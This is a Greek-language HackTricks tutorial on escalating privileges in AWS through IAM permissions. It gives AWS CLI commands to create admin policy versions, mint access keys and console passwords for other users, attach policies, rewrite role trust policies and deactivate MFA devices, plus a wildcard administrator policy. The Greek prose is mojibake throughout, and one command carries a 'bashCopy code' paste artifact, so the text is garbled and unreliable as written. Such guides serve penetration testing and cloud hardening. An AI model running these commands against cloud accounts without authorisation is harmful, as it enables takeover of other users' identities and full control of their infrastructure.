# AWS - IAM Privesc

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ ÎºÎ±Î¹ ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ ÎºÎ±Î¹ ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î“Î¯Î½ÎµÏ„Îµ Î¼Î­Î»Î¿Ï‚ Ï„Î·Ï‚** ğŸ’¬ [**Î¿Î¼Î¬Î´Î±Ï‚ Discord**](https://discord.gg/hRep4RUj7f) Î® Ï„Î·Ï‚ [**Î¿Î¼Î¬Î´Î±Ï‚ telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ hacking tricks Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ github.

</details>
{% endhint %}

## IAM

Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¿ IAM, ÎµÎ»Î­Î³Î¾Ï„Îµ:

{% content-ref url="../aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### **`iam:CreatePolicyVersion`**

Î Î±ÏÎ­Ï‡ÎµÎ¹ Ï„Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î±Ï‚ Î½Î­Î±Ï‚ Î­ÎºÎ´Î¿ÏƒÎ·Ï‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ IAM, Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Î±Î½Î¬Î³ÎºÎ· Î³Î¹Î± Î¬Î´ÎµÎ¹Î± `iam:SetDefaultPolicyVersion` Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î· ÏƒÎ·Î¼Î±Î¯Î± `--set-as-default`. Î‘Ï…Ï„ÏŒ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î¿Î½ Î¿ÏÎ¹ÏƒÎ¼ÏŒ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Ï‰Î½ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½.

**Î•Î½Ï„Î¿Î»Î® Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚:**
```bash
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
**Î•Ï€Î¯Ï€Ï„Ï‰ÏƒÎ·:** Î‘Ï…Î¾Î¬Î½ÎµÎ¹ Î¬Î¼ÎµÏƒÎ± Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± ÏƒÎµ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ Ï€ÏŒÏÎ¿.

### **`iam:SetDefaultPolicyVersion`**

Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Î±Î»Î»Î±Î³Î® Ï„Î·Ï‚ Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î·Ï‚ Î­ÎºÎ´Î¿ÏƒÎ·Ï‚ Î¼Î¹Î±Ï‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ IAM ÏƒÎµ Î¼Î¹Î± Î¬Î»Î»Î· Ï…Ï€Î¬ÏÏ‡Î¿Ï…ÏƒÎ± Î­ÎºÎ´Î¿ÏƒÎ·, ÎµÎ½Î´ÎµÏ‡Î¿Î¼Î­Î½Ï‰Ï‚ Î±Ï…Î¾Î¬Î½Î¿Î½Ï„Î±Ï‚ Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Î±Î½ Î· Î½Î­Î± Î­ÎºÎ´Î¿ÏƒÎ· Î­Ï‡ÎµÎ¹ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î¬Î´ÎµÎ¹ÎµÏ‚.

**Î•Î½Ï„Î¿Î»Î® Bash:**
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v2
```
**Î•Ï€Î¯Ï€Ï„Ï‰ÏƒÎ·:** ÎˆÎ¼Î¼ÎµÏƒÎ· ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ Î¼Î­ÏƒÏ‰ Ï„Î·Ï‚ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÏ‰Î½ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½.

### **`iam:CreateAccessKey`**

Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± access key ID ÎºÎ±Î¹ secret access key Î³Î¹Î± Î¬Î»Î»Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î·, Î¿Î´Î·Î³ÏÎ½Ï„Î±Ï‚ ÏƒÎµ Ï€Î¹Î¸Î±Î½Î® ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½.

**Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·:**
```bash
aws iam create-access-key --user-name <target_user>
```
**Î•Ï€Î¯Ï€Ï„Ï‰ÏƒÎ·:** Î†Î¼ÎµÏƒÎ· ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ Î¼Îµ Ï„Î·Î½ Î±Î½Î¬Î»Î·ÏˆÎ· Ï„Ï‰Î½ ÎµÎºÏ„ÎµÏ„Î±Î¼Î­Î½Ï‰Î½ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½ Î¬Î»Î»Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î·.

### **`iam:CreateLoginProfile` | `iam:UpdateLoginProfile`**

Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Î® Ï„Î·Î½ ÎµÎ½Î·Î¼Î­ÏÏ‰ÏƒÎ· ÎµÎ½ÏŒÏ‚ Ï€ÏÎ¿Ï†Î¯Î» ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚, ÏƒÏ…Î¼Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î±Î½Î¿Î¼Î­Î½Î¿Ï… Ï„Î¿Ï… Î¿ÏÎ¹ÏƒÎ¼Î¿Ï ÎºÏ‰Î´Î¹ÎºÏÎ½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î³Î¹Î± ÏƒÏÎ½Î´ÎµÏƒÎ· ÏƒÏ„Î·Î½ ÎºÎ¿Î½ÏƒÏŒÎ»Î± AWS, Î¿Î´Î·Î³ÏÎ½Ï„Î±Ï‚ ÏƒÎµ Î¬Î¼ÎµÏƒÎ· ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½.

**Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Î³Î¹Î± Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î±:**
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Î³Î¹Î± Î•Î½Î·Î¼Î­ÏÏ‰ÏƒÎ·:**
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Î•Ï€Î¯Ï€Ï„Ï‰ÏƒÎ·:** Î†Î¼ÎµÏƒÎ· ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ Î¼Îµ ÏƒÏÎ½Î´ÎµÏƒÎ· Ï‰Ï‚ "Î¿Ï€Î¿Î¹Î¿ÏƒÎ´Î®Ï€Î¿Ï„Îµ" Ï‡ÏÎ®ÏƒÏ„Î·Ï‚.

### **`iam:UpdateAccessKey`**

Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· ÎµÎ½ÏŒÏ‚ Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿Ï… ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚, Ï€Î¿Ï… ÎµÎ½Î´ÎµÏ‡Î¿Î¼Î­Î½Ï‰Ï‚ Î¿Î´Î·Î³ÎµÎ¯ ÏƒÎµ Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î±Î½ Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ ÎºÎ±Ï„Î­Ï‡ÎµÎ¹ Ï„Î¿ Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿ ÎºÎ»ÎµÎ¹Î´Î¯.

**Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·:**

{% code overflow="wrap" %}
```bash
aws iam update-access-key --access-key-id <ACCESS_KEY_ID> --status Active --user-name <username>
```
{% endcode %}

**Î•Ï€Î¯Ï€Ï„Ï‰ÏƒÎ·:** Î†Î¼ÎµÏƒÎ· ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ Î¼Îµ Ï„Î·Î½ ÎµÏ€Î±Î½ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· ÎºÎ»ÎµÎ¹Î´Î¹ÏÎ½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚.

### **`iam:CreateServiceSpecificCredential` | `iam:ResetServiceSpecificCredential`**

Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Î® Ï„Î·Î½ ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î·ÏÎ¯Ï‰Î½ Î³Î¹Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½ÎµÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ AWS (Ï€.Ï‡., CodeCommit, Amazon Keyspaces), ÎºÎ»Î·ÏÎ¿Î½Î¿Î¼ÏÎ½Ï„Î±Ï‚ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Ï„Î¿Ï… ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¿Ï Ï‡ÏÎ®ÏƒÏ„Î·.

**Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Î³Î¹Î± Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î±:**

{% code overflow="wrap" %}
```bash
aws iam create-service-specific-credential --user-name <username> --service-name <service>
```
{% endcode %}

**Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Î³Î¹Î± Î•Ï€Î±Î½Î±Ï†Î¿ÏÎ¬:**

{% code overflow="wrap" %}
```bash
aws iam reset-service-specific-credential --service-specific-credential-id <credential_id>
```
{% endcode %}

**Î•Ï€Î¯Ï€Ï„Ï‰ÏƒÎ·:** Î†Î¼ÎµÏƒÎ· ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ ÎµÎ½Ï„ÏŒÏ‚ Ï„Ï‰Î½ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î·.

### **`iam:AttachUserPolicy` || `iam:AttachGroupPolicy`**

Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ ÎµÏ€Î¹ÏƒÏÎ½Î±ÏˆÎ· Ï€Î¿Î»Î¹Ï„Î¹ÎºÏÎ½ ÏƒÎµ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î® Î¿Î¼Î¬Î´ÎµÏ‚, ÎºÎ»Î¹Î¼Î±ÎºÏÎ½Î¿Î½Ï„Î±Ï‚ Î¬Î¼ÎµÏƒÎ± Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Î¼Î­ÏƒÏ‰ Ï„Î·Ï‚ ÎºÎ»Î·ÏÎ¿Î½Î¿Î¼Î¹Î¬Ï‚ Ï„Ï‰Î½ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½ Ï„Î·Ï‚ ÎµÏ€Î¹ÏƒÏ…Î½Î±Ï€Ï„ÏŒÎ¼ÎµÎ½Î·Ï‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚.

**Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Î³Î¹Î± Î§ÏÎ®ÏƒÏ„Î·:**
```bash
aws iam attach-user-policy --user-name <username> --policy-arn "<policy_arn>"
```
**Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Î³Î¹Î± ÎŸÎ¼Î¬Î´Î±:**
```bash
aws iam attach-group-policy --group-name <group_name> --policy-arn "<policy_arn>"
```
**Î•Ï€Î¯Ï€Ï„Ï‰ÏƒÎ·:** Î†Î¼ÎµÏƒÎ· ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ ÏƒÎµ Î¿Ï„Î¹Î´Î®Ï€Î¿Ï„Îµ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î· Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®.

### **`iam:AttachRolePolicy`,** ( `sts:AssumeRole`|`iam:createrole`) | **`iam:PutUserPolicy` | `iam:PutGroupPolicy` | `iam:PutRolePolicy`**

Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ ÎµÏ€Î¹ÏƒÏÎ½Î±ÏˆÎ· Î® Ï„Î·Î½ Ï„Î¿Ï€Î¿Î¸Î­Ï„Î·ÏƒÎ· Ï€Î¿Î»Î¹Ï„Î¹ÎºÏÎ½ ÏƒÎµ ÏÏŒÎ»Î¿Ï…Ï‚, Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î® Î¿Î¼Î¬Î´ÎµÏ‚, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Î¬Î¼ÎµÏƒÎ· ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ Î¼Î­ÏƒÏ‰ Ï„Î·Ï‚ Ï‡Î¿ÏÎ®Î³Î·ÏƒÎ·Ï‚ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½.

**Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Î³Î¹Î± Î¡ÏŒÎ»Î¿:**
```bash
bashCopy codeaws iam attach-role-policy --role-name <role_name> --policy-arn "<policy_arn>"
```
**Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Î³Î¹Î± Inline Policies:**
```bash
aws iam put-user-policy --user-name <username> --policy-name "<policy_name>" \
--policy-document "file:///path/to/policy.json"

aws iam put-group-policy --group-name <group_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json

aws iam put-role-policy --role-name <role_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json
```
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î¼Î¹Î± Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® ÏŒÏ€Ï‰Ï‚:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"*"
],
"Resource": [
"*"
]
}
]
}
```
**Î•Ï€Î¯Ï€Ï„Ï‰ÏƒÎ·:** Î†Î¼ÎµÏƒÎ· ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ Î¼Îµ Ï„Î·Î½ Ï€ÏÎ¿ÏƒÎ¸Î®ÎºÎ· Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½ Î¼Î­ÏƒÏ‰ Ï€Î¿Î»Î¹Ï„Î¹ÎºÏÎ½.

### **`iam:AddUserToGroup`**

Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Ï€ÏÎ¿ÏƒÎ¸Î®ÎºÎ· Ï„Î¿Ï… ÎµÎ±Ï…Ï„Î¿Ï ÏƒÎµ Î¼Î¹Î± Î¿Î¼Î¬Î´Î± IAM, ÎºÎ»Î¹Î¼Î±ÎºÏÎ½Î¿Î½Ï„Î±Ï‚ Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Î¼Îµ Ï„Î·Î½ ÎºÎ»Î·ÏÎ¿Î½Î¿Î¼Î¹Î¬ Ï„Ï‰Î½ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½ Ï„Î·Ï‚ Î¿Î¼Î¬Î´Î±Ï‚.

**Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·:**

{% code overflow="wrap" %}
```bash
aws iam add-user-to-group --group-name <group_name> --user-name <username>
```
{% endcode %}

**Î•Ï€Î¯Ï€Ï„Ï‰ÏƒÎ·:** Î†Î¼ÎµÏƒÎ· ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ ÏƒÏ„Î¿ ÎµÏ€Î¯Ï€ÎµÎ´Î¿ Ï„Ï‰Î½ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½ Ï„Î·Ï‚ Î¿Î¼Î¬Î´Î±Ï‚.

### **`iam:UpdateAssumeRolePolicy`**

Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Î±Î»Î»Î±Î³Î® Ï„Î¿Ï… ÎµÎ³Î³ÏÎ¬Ï†Î¿Ï… Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ Î±Î½Î¬Î»Î·ÏˆÎ·Ï‚ ÏÏŒÎ»Î¿Ï… ÎµÎ½ÏŒÏ‚ ÏÏŒÎ»Î¿Ï…, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Î±Î½Î¬Î»Î·ÏˆÎ· Ï„Î¿Ï… ÏÏŒÎ»Î¿Ï… ÎºÎ±Î¹ Ï„Ï‰Î½ ÏƒÏ‡ÎµÏ„Î¹ÎºÏÎ½ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½ Ï„Î¿Ï….

**Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·:**
```bash
aws iam update-assume-role-policy --role-name <role_name> \
--policy-document file:///path/to/assume/role/policy.json
```
ÎŒÏ€Î¿Ï… Î· Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® Î¼Î¿Î¹Î¬Î¶ÎµÎ¹ Î¼Îµ Ï„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰, Î· Î¿Ï€Î¿Î¯Î± Î´Î¯Î½ÎµÎ¹ ÏƒÏ„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± Î½Î± Î±Î½Î±Î»Î¬Î²ÎµÎ¹ Ï„Î¿Î½ ÏÏŒÎ»Î¿:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**Î•Ï€Î¯Ï€Ï„Ï‰ÏƒÎ·:** Î†Î¼ÎµÏƒÎ· ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ Î¼Îµ Ï„Î·Î½ Î±Î½Î¬Î»Î·ÏˆÎ· Ï„Ï‰Î½ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½ Î¿Ï€Î¿Î¹Î¿Ï…Î´Î®Ï€Î¿Ï„Îµ ÏÏŒÎ»Î¿Ï….

### **`iam:UploadSSHPublicKey` || `iam:DeactivateMFADevice`**

Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î· Î¼ÎµÏ„Î±Ï†ÏŒÏÏ„Ï‰ÏƒÎ· ÎµÎ½ÏŒÏ‚ Î´Î·Î¼ÏŒÏƒÎ¹Î¿Ï… ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï SSH Î³Î¹Î± Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· ÏƒÏ„Î¿ CodeCommit ÎºÎ±Î¹ Ï„Î·Î½ Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· ÏƒÏ…ÏƒÎºÎµÏ…ÏÎ½ MFA, Î¿Î´Î·Î³ÏÎ½Ï„Î±Ï‚ ÏƒÎµ Ï€Î¹Î¸Î±Î½Î® Î­Î¼Î¼ÎµÏƒÎ· ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½.

**Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Î³Î¹Î± ÎœÎµÏ„Î±Ï†ÏŒÏÏ„Ï‰ÏƒÎ· ÎšÎ»ÎµÎ¹Î´Î¹Î¿Ï SSH:**
```bash
aws iam upload-ssh-public-key --user-name <username> --ssh-public-key-body <key_body>
```
**Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Î³Î¹Î± Î‘Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· MFA:**
```bash
aws iam deactivate-mfa-device --user-name <username> --serial-number <serial_number>
```
**Î•Ï€Î¯Ï€Ï„Ï‰ÏƒÎ·:** ÎˆÎ¼Î¼ÎµÏƒÎ· ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ Î¼Î­ÏƒÏ‰ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÏ„Î¿ CodeCommit Î® Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ Ï„Î·Ï‚ Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯Î±Ï‚ MFA.

### **`iam:ResyncMFADevice`**

Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î¿Î½ ÎµÏ€Î±Î½Î±ÏƒÏ…Î³Ï‡ÏÎ¿Î½Î¹ÏƒÎ¼ÏŒ Î¼Î¹Î±Ï‚ ÏƒÏ…ÏƒÎºÎµÏ…Î®Ï‚ MFA, Ï€Î¿Ï… ÎµÎ½Î´ÎµÏ‡Î¿Î¼Î­Î½Ï‰Ï‚ Î¿Î´Î·Î³ÎµÎ¯ ÏƒÎµ Î­Î¼Î¼ÎµÏƒÎ· ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ Î¼Î­ÏƒÏ‰ Ï‡ÎµÎ¹ÏÎ±Î³ÏÎ³Î·ÏƒÎ·Ï‚ Ï„Î·Ï‚ Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯Î±Ï‚ MFA.

**Î•Î½Ï„Î¿Î»Î® Bash:**
```bash
aws iam resync-mfa-device --user-name <username> --serial-number <serial_number> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**Î•Ï€Î¯Ï€Ï„Ï‰ÏƒÎ·:** ÎˆÎ¼Î¼ÎµÏƒÎ· ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ Î¼Î­ÏƒÏ‰ Ï€ÏÎ¿ÏƒÎ¸Î®ÎºÎ·Ï‚ Î® Ï‡ÎµÎ¹ÏÎ¹ÏƒÎ¼Î¿Ï ÏƒÏ…ÏƒÎºÎµÏ…ÏÎ½ MFA.

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

ÎœÎµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î±Î»Î»Î¬Î¾ÎµÏ„Îµ Ï„Î± XML metadata Ï„Î·Ï‚ ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚ SAML**. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Ï„Î· **SAML federation** Î³Î¹Î± Î½Î± **ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯Ï„Îµ** Î¼Îµ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ **ÏÏŒÎ»Î¿ Ï€Î¿Ï… Ï„Î·Î½ ÎµÎ¼Ï€Î¹ÏƒÏ„ÎµÏÎµÏ„Î±Î¹**.

